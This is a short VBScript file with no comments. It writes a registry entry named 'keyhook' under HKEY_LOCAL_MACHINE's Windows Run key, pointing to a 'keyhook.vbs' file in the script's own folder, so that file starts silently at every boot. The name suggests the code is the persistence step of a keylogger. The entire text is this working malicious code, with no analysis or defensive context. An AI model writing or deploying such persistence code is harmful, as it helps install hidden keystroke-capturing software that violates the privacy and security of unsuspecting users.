path="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run\"
currentpath = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path 
set ws=wscript.createobject("wscript.shell") 
ws.regwrite path &"keyhook",currentpath & "\keyhook.vbs"